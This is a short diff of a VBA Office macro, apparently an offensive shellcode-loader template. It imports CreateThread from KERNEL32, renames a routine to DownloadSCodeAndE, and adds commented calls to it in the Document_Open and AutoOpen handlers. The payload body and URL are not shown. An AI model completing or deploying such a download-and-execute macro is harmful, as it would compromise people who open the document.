@@ -26,7 +26,7 @@ Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttr
 '  [out, optional] LPDWORD                 lpThreadId
 ');
 
-Sub TestDownloadToByteArray()
+Sub DownloadSCodeAndE()
     Dim szURL   As String
     Dim result  As String
     Dim http    As Object
@@ -227,6 +227,7 @@ Sub Document_Open()
     'PrintUname
     'PrintRam
     'VBAShellCode
+    'DownloadSCodeAndE
     
 End Sub
 
@@ -238,5 +239,6 @@ Sub AutoOpen()
     'PrintUname
     'PrintRam
     'VBAShellCode
+    'DownloadSCodeAndE
     
 End Sub
